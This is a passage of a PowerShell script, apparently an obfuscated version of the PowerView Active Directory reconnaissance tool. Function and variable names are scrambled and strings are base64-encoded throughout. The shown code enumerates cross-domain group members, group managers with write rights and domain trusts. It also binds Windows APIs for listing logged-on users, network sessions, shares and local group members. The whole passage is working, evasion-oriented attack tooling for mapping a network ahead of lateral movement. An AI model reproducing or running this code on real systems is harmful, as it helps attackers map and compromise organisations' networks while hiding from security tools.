        _____/\/===\/=\/== -GroupName $GroupName -Filter '(member=*)' -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | ? {
            -not (${___/\__/====\/\/\} -contains $_.samaccountname) } | % {
                $GroupName = $_.samAccountName
                $_.member | % {
                    if (($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwAtADEALQA1AC0AMgAxAC4AKgAtAC4AKgA=')))) -or (${/==\/=\/\__/\_/==} -ne ($_.substring($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A')))))))) {
                        ${_/====\__/\_/==\/} = $_.subString($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        $UserName = $_.split(",")[0].split("=")[1]
                        ${___/\_/=\/\/\___/} = New-Object PSObject
                        ${___/\_/=\/\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) $Domain
                        ${___/\_/=\/\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                        ${___/\_/=\/\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) ${_/====\__/\_/==\/}
                        ${___/\_/=\/\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                        ${___/\_/=\/\/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAE4A'))) $_
                        ${___/\_/=\/\/\___/}
                    }
                }
        }
    }
    if ($Recurse) {
        if($LDAP -or $DomainController) {
            ${_/===\/====\/\__/} = __/\_/==\/=\_/\_/\ -LDAP -DomainController $DomainController -PageSize $PageSize | % { $_.SourceDomain } | sort -Unique
        }
        else {
            ${_/===\/====\/\__/} = __/\_/==\/=\_/\_/\ -PageSize $PageSize | % { $_.SourceDomain } | sort -Unique
        }
        ForEach(${_/\/===\_/\/=\__/} in ${_/===\/====\/\__/}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAdAByAHUAcwB0ACAAZwByAG8AdQBwAHMAIABpAG4AIABkAG8AbQBhAGkAbgAgACQAewBfAC8AXAAvAD0APQA9AFwAXwAvAFwALwA9AFwAXwBfAC8AfQA=')))
            ___/\_/\/==\/=\/\_ -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    else {
        ___/\_/\/==\/=\/\_ -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
    }
}
function Find-ManagedSecurityGroups {
    _____/\/===\/=\/== -FullData -Filter '(managedBy=*)' | select -Unique distinguishedName,managedBy,cn | % {
        ${_/==\__/\__/\_/\/} = ___/\/\/\/\/==\/\_ -ADSPath $_.managedBy | select cn,distinguishedname,name,samaccounttype,samaccountname
        ${__/\/\_/=\_/==\/\} = New-Object -TypeName PSObject -Property @{
            'GroupCN' = $_.cn
            'GroupDN' = $_.distinguishedname
            'ManagerCN' = ${_/==\__/\__/\_/\/}.cn
            'ManagerDN' = ${_/==\__/\__/\_/\/}.distinguishedName
            'ManagerSAN' = ${_/==\__/\__/\_/\/}.samaccountname
            'ManagerType' = ''
            'CanManagerWrite' = $FALSE
        }
        if (${_/==\__/\__/\_/\/}.samaccounttype -eq 0x10000000) {
            ${__/\/\_/=\_/==\/\}.ManagerType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))
        } elseif (${_/==\__/\__/\_/\/}.samaccounttype -eq 0x30000000) {
            ${__/\/\_/=\_/==\/\}.ManagerType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))
        }
        ${_/=\_/====\__/\/=} = __/=\_/=\_/\___/== -ADSPath $_.distinguishedname -___/\/\/\__/==\/=\ WriteMembers
        if (${_/=\_/====\__/\/=}.ObjectType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) -and ${_/=\_/====\__/\/=}.AccessControlType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA=='))) -and ${_/=\_/====\__/\/=}.IdentityReference.Value.Contains(${_/==\__/\__/\_/\/}.samaccountname)) {
            ${__/\/\_/=\_/==\/\}.CanManagerWrite = $TRUE
        }
        ${__/\/\_/=\_/==\/\}
    }
}
function __/\_/==\/=\_/\_/\ {
    [CmdletBinding()]
    param(
        [Switch]
        $LDAP,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    ${/===\_/==\_/\/==\} = @{}
    ${__/=====\/=====\_} = New-Object System.Collections.Stack
    ${__/\/\_/=\___/=\/} = (______/====\/=\__/ -Credential $Credential).Name
    ${__/=====\/=====\_}.push(${__/\/\_/=\___/=\/})
    while(${__/=====\/=====\_}.Count -ne 0) {
        $Domain = ${__/=====\/=====\_}.Pop()
        if ($Domain -and ($Domain.Trim() -ne "") -and (-not ${/===\_/==\_/\/==\}.ContainsKey($Domain))) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAdAByAHUAcwB0AHMAIABmAG8AcgAgAGQAbwBtAGEAaQBuACAAJwAkAEQAbwBtAGEAaQBuACcA')))
            $Null = ${/===\_/==\_/\/==\}.add($Domain, "")
            try {
                if($LDAP -or $DomainController) {
                    ${__/\/\/===\/\/\_/} = __/=\/\_/\_/\_____ -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize -Credential $Credential
                }
                else {
                    ${__/\/\/===\/\/\_/} = __/=\/\_/\_/\_____ -Domain $Domain -PageSize $PageSize -Credential $Credential
                }
                if(${__/\/\/===\/\/\_/} -isnot [System.Array]) {
                    ${__/\/\/===\/\/\_/} = @(${__/\/\/===\/\/\_/})
                }
                if(-not ($LDAP -or $DomainController) ) {
                    ${__/\/\/===\/\/\_/} += _/==\/\/\_/=\_/\_/ -Forest $Domain -Credential $Credential
                }
                if (${__/\/\/===\/\/\_/}) {
                    if(${__/\/\/===\/\/\_/} -isnot [System.Array]) {
                        ${__/\/\/===\/\/\_/} = @(${__/\/\/===\/\/\_/})
                    }
                    ForEach (${_/=\/=\__/\/\/\_/} in ${__/\/\/===\/\/\_/}) {
                        if(${_/=\/=\__/\/\/\_/}.SourceName -and ${_/=\/=\__/\/\/\_/}.TargetName) {
                            ${_/=\__/=\_/=\_/\_} = ${_/=\/=\__/\/\/\_/}.SourceName
                            ${____/=\/===\/=\_/} = ${_/=\/=\__/\/\/\_/}.TargetName
                            ${/=\/\/====\_/\/=\} = ${_/=\/=\__/\/\/\_/}.TrustType
                            ${____/===\____/\/\} = ${_/=\/=\__/\/\/\_/}.TrustDirection
                            ${/===\/=\/=\/=\/\/} = ${_/=\/=\__/\/\/\_/}.PSObject.TypeNames | ? {$_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcA')))} | select -First 1
                            $Null = ${__/=====\/=====\_}.Push(${____/=\/===\/=\_/})
                            ${_/\/===\_/\/=\__/} = New-Object PSObject
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUARABvAG0AYQBpAG4A'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwAXwBfAC8APQBcAF8ALwA9AFwAXwAvAFwAXwB9AA==')))
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUAUwBJAEQA'))) ${_/=\/=\__/\/\/\_/}.SourceSID
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAF8ALwA9AFwALwA9AD0APQBcAC8APQBcAF8ALwB9AA==')))
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBJAEQA'))) ${_/=\/=\__/\/\/\_/}.TargetSID
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8AXAAvAD0APQA9AD0AXABfAC8AXAAvAD0AXAB9AA==')))
                            ${_/\/===\_/\/=\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAF8ALwA9AD0APQBcAF8AXwBfAF8ALwBcAC8AXAB9AA==')))
                            ${_/\/===\_/\/=\__/}.PSObject.TypeNames.Add(${/===\/=\/=\/=\/\/})
                            ${_/\/===\_/\/=\__/}
                        }
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
            }
        }
    }
}
${__/\/=\____/=\_/\} = __/=\/\/==\__/\_/\ -_/=\_____/\____/\_ Win32
${_/==\__/\/===\__/} = @(
    (_/=\/\/=\/\/\/\/=\ netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (_/=\/\/=\/\/\/\/=\ netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (_/=\/\/=\/\/\/\/=\ netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (_/=\/\/=\/\/\/\/=\ netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (_/=\/\/=\/\/\/\/=\ netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (_/=\/\/=\/\/\/\/=\ netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (_/=\/\/=\/\/\/\/=\ netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (_/=\/\/=\/\/\/\/=\ advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -__/\_/\_/\/\/=\_/=),
    (_/=\/\/=\/\/\/\/=\ advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -__/\_/\_/\/\/=\_/=),
    (_/=\/\/=\/\/\/\/=\ advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (_/=\/\/=\/\/\/\/=\ wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (_/=\/\/=\/\/\/\/=\ wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -__/\_/\_/\/\/=\_/=),
    (_/=\/\/=\/\/\/\/=\ wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -__/\_/\_/\/\/=\_/=),
    (_/=\/\/=\/\/\/\/=\ wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (_/=\/\/=\/\/\/\/=\ wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (_/=\/\/=\/\/\/\/=\ wtsapi32 WTSCloseServer ([Int]) @([IntPtr]))
)
${/=\_____/\/===\_/} = __/\_______/=\/\/\ ${__/\/=\____/=\_/\} WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
${/=\/\/\___/\__/=\} = _/==\__/=======\/= ${__/\/=\____/=\_/\} WTS_SESSION_INFO_1 @{
    ExecEnvId = _/=\_/==\____/\/=\ 0 UInt32
    State = _/=\_/==\____/\/=\ 1 ${/=\_____/\/===\_/}
    SessionId = _/=\_/==\____/\/=\ 2 UInt32
    pSessionName = _/=\_/==\____/\/=\ 3 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pHostName = _/=\_/==\____/\/=\ 4 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pUserName = _/=\_/==\____/\/=\ 5 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pDomainName = _/=\_/==\____/\/=\ 6 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pFarmName = _/=\_/==\____/\/=\ 7 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${_/\/\____/===\__/} = _/==\__/=======\/= ${__/\/=\____/=\_/\} WTS_CLIENT_ADDRESS @{
    AddressFamily = _/=\_/==\____/\/=\ 0 UInt32
    Address = _/=\_/==\____/\/=\ 1 Byte[] -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
${_____/==\_/=\/\__} = _/==\__/=======\/= ${__/\/=\____/=\_/\} SHARE_INFO_1 @{
    shi1_netname = _/=\_/==\____/\/=\ 0 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    shi1_type = _/=\_/==\____/\/=\ 1 UInt32
    shi1_remark = _/=\_/==\____/\/=\ 2 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${/===\_/\/===\/\__} = _/==\__/=======\/= ${__/\/=\____/=\_/\} WKSTA_USER_INFO_1 @{
    wkui1_username = _/=\_/==\____/\/=\ 0 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    wkui1_logon_domain = _/=\_/==\____/\/=\ 1 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    wkui1_oth_domains = _/=\_/==\____/\/=\ 2 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    wkui1_logon_server = _/=\_/==\____/\/=\ 3 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${/=\/\/\_/\/==\/\/} = _/==\__/=======\/= ${__/\/=\____/=\_/\} SESSION_INFO_10 @{
    sesi10_cname = _/=\_/==\____/\/=\ 0 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    sesi10_username = _/=\_/==\____/\/=\ 1 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    sesi10_time = _/=\_/==\____/\/=\ 2 UInt32
    sesi10_idle_time = _/=\_/==\____/\/=\ 3 UInt32
}
${_/\__/\/===\____/} = __/\_______/=\/\/\ ${__/\/=\____/=\_/\} SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
${/===\__/\_/\/\_/\} = _/==\__/=======\/= ${__/\/=\____/=\_/\} LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = _/=\_/==\____/\/=\ 0 IntPtr
    lgrmi2_sidusage = _/=\_/==\____/\/=\ 1 ${_/\__/\/===\____/}
    lgrmi2_domainandname = _/=\_/==\____/\/=\ 2 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${/=\__/\/\/==\/\/\} = __/\_______/=\/\/\ ${__/\/=\____/=\_/\} DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -_/=\/==\_/\/=\/===
${_/\/\/====\/\/=\_} = __/\_______/=\/\/\ ${__/\/=\____/=\_/\} DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
${__/\__/==\/\_/\/=} = __/\_______/=\/\/\ ${__/\/=\____/=\_/\} DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
${/=\/\/\/==\/=\___} = _/==\__/=======\/= ${__/\/=\____/=\_/\} DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = _/=\_/==\____/\/=\ 0 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    DnsDomainName = _/=\_/==\____/\/=\ 1 String -__/==\__/=\_/\_/\/ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Flags = _/=\_/==\____/\/=\ 2 ${/=\__/\/\/==\/\/\}
    ParentIndex = _/=\_/==\____/\/=\ 3 UInt32
    TrustType = _/=\_/==\____/\/=\ 4 ${_/\/\/====\/\/=\_}
    TrustAttributes = _/=\_/==\____/\/=\ 5 ${__/\__/==\/\_/\/=}
    DomainSid = _/=\_/==\____/\/=\ 6 IntPtr
    DomainGuid = _/=\_/==\____/\/=\ 7 Guid
}
${___/\/\_/==\/\/\_} = ${_/==\__/\/===\__/} | __/\/==\_/\___/==\ -_____/=\_/=\__/=\_ ${__/\/=\____/=\_/\} -_/=\_/=\_/===\____ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
${/=\/====\_/\/===\} = ${___/\/\_/==\/\/\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAYQBwAGkAMwAyAA==')))]
${__/==\__/\_/\/\/=} = ${___/\/\_/==\/\/\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAA==')))]
${/===\__/==\__/==\} = ${___/\/\_/==\/\/\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwB0AHMAYQBwAGkAMwAyAA==')))]
